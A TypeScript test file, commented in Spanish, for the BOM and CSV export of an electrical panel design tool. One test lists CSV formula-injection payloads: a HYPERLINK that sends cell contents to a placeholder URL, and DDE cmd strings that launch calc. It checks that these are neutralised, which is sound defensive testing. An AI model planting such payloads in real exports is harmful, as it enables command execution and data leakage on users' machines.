/**
 * Tests del motor de documentación (BOM, CSV) sobre el proyecto de ejemplo completo.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';

import { EJEMPLOS } from '../ejemplo/biblioteca.js';
import { tableroEjemplo } from '../ejemplo/tablero-ejemplo.js';
import { calcularPotenciales } from '../src/motores/potenciales.js';
import { numerarConductores, numerarDispositivos } from '../src/motores/numeracion.js';
import { verificarProyecto } from '../src/motores/drc.js';
import { aCSV, bomACSV, generarBOM, generarListaConductores } from '../src/motores/documentacion.js';
import { rutearConductores } from '../src/motores/ruteo.js';

const sinBom = (texto: string) => texto.startsWith('\uFEFF') ? texto.slice(1) : texto;

test('BOM: agrupa por referencia y suma cantidades', () => {
	const p = tableroEjemplo();
	numerarDispositivos(p);
	const bom = generarBOM(p);
	const ut4 = bom.find((f) => f.referencia === 'UT 4')!;
	assert.equal(ut4.cantidad, 1);
	assert.ok(ut4.designaciones[0].startsWith('-X'));
	// Todos los dispositivos aparecen exactamente una vez en la BOM.
	assert.equal(bom.reduce((s, f) => s + f.cantidad, 0), p.dispositivos.length);
});

test('CSV: escapa separadores y comillas', () => {
	const csv = aCSV([['a;b', 'con "comillas"', 'normal']]);
	assert.equal(sinBom(csv), '"a;b";"con ""comillas""";normal');
});

test('CSV: sus bytes empiezan por BOM UTF-8 y conservan acentos para Excel', () => {
	const texto = aCSV([['Descripción', 'Distribución', 'Protección', 'Número', 'Sección', 'Designación'],
		['marrón', 'áéíóúñÑ', 'ASCII', '123', undefined, '']]);
	const bytes = new TextEncoder().encode(texto);
	assert.deepEqual([...bytes.slice(0, 3)], [0xef, 0xbb, 0xbf]);
	assert.equal(new TextDecoder('utf-8').decode(bytes.slice(3)),
		'Descripción;Distribución;Protección;Número;Sección;Designación\nmarrón;áéíóúñÑ;ASCII;123;;');
});

/*
 * Auditoría TS-P2-15. Un CSV es texto plano y la hoja de cálculo se lo cree entero: si una celda
 * empieza por `=`, `+`, `-` o `@`, Excel y LibreOffice no enseñan ese texto, EJECUTAN lo que
 * ponga. Aquí no es teórico —la lista de materiales lleva la descripción de cada aparato, que
 * puede venir de un proyecto que mandó otro, y el parte de obra lleva la nota que uno escribe en
 * la cubierta y manda por correo al terminar la jornada—.
 */
test('CSV: una celda que empieza por = no se ejecuta al abrir la hoja', () => {
	const trampas = [
		'=HYPERLINK("http://x?"&A1,"pincha")',
		'=cmd|\'/c calc\'!A1',
		'+1+1',
		'@SUM(A1:A9)',
		'-2+3+cmd|\' /c calc\'!A0',
	];
	for (const t of trampas) {
		const celda = sinBom(aCSV([[t]])).replace(/^"|"$/g, '');
		assert.ok(celda.startsWith("'"), `«${t}» sigue arrancando fórmula: «${celda}»`);
		// El apóstrofo no se ve en la hoja: el texto se sigue leyendo igual que se escribió.
		assert.equal(celda.slice(1).replaceAll('""', '"'), t);
	}
});

test('CSV: un número con signo sigue siendo un número, no texto', () => {
	// Neutralizar de más rompería las columnas de cotas y longitudes, que salen negativas.
	assert.equal(sinBom(aCSV([[-5, 3.5, '-12', '+3,5', '-1.2e3']])), '-5;3.5;-12;+3,5;-1.2e3');
});

test('CSV: el texto normal no se toca', () => {
	assert.equal(sinBom(aCSV([['UMA-3-343', 'Disyuntor 1P C10', 'iC60N', 10]])),
		'UMA-3-343;Disyuntor 1P C10;iC60N;10');
});

test('el proyecto de ejemplo pasa el DRC sin errores', () => {
	const p = tableroEjemplo();
	numerarDispositivos(p);
	const potenciales = calcularPotenciales(p);
	numerarConductores(p, potenciales);
	const errores = verificarProyecto(p, potenciales).filter((h) => h.severidad === 'error');
	assert.deepEqual(errores.map((e) => e.mensaje), []);
});

test('lista de conductores del ejemplo: numerada y con longitudes ruteadas', () => {
	const p = tableroEjemplo();
	numerarDispositivos(p);
	const potenciales = calcularPotenciales(p);
	numerarConductores(p, potenciales);
	const ruteo = rutearConductores(p);
	const filas = generarListaConductores(p, ruteo);

	// El potencial PE se etiqueta "PE".
	assert.ok(filas.some((f) => f.numero === 'PE'));
	// Los conductores entre aparatos colocados tienen longitud física.
	const interna = filas.find((f) => f.de.includes('-Q') && f.a.includes('-T'));
	assert.ok(interna);
	assert.ok((interna.longitudMm ?? 0) > 0);
	// El CSV de la BOM tiene cabecera + una fila por grupo.
	assert.ok(bomACSV(generarBOM(p)).split('\n').length > 5);
});

test('TODOS los ejemplos de la biblioteca pasan el DRC sin errores', () => {
	// Un ejemplo con un error de cableado no es un ejemplo: es una lección de cómo NO hacerlo.
	// Esta prueba barre la biblioteca entera para que no se cuele ninguno al añadir uno nuevo.
	for (const e of EJEMPLOS) {
		const p = e.crear();
		numerarDispositivos(p);
		const potenciales = calcularPotenciales(p);
		numerarConductores(p, potenciales);
		// Se verifica CON el ruteo, que es como lo hace el programa: sin las longitudes y sin saber
		// qué comparte canaleta, la coordinación no puede corregir por agrupamiento ni reconocer una
		// derivación corta, y comprobaría los ejemplos en unas condiciones que no son las suyas.
		const ruteo = rutearConductores(p);
		const errores = verificarProyecto(p, potenciales, {
			longitudesMm: new Map(ruteo.rutas.map((r) => [r.conductorId, r.longitudMm])),
			canaletas: ruteo.ocupaciones,
			canaletasPorConductor: new Map(ruteo.rutas.map((r) => [r.conductorId, r.canaletasUsadas])),
		}).filter((h) => h.severidad === 'error');
		assert.deepEqual(errores.map((x) => x.mensaje), [], `el ejemplo «${e.id}» tiene errores de DRC`);
	}
});
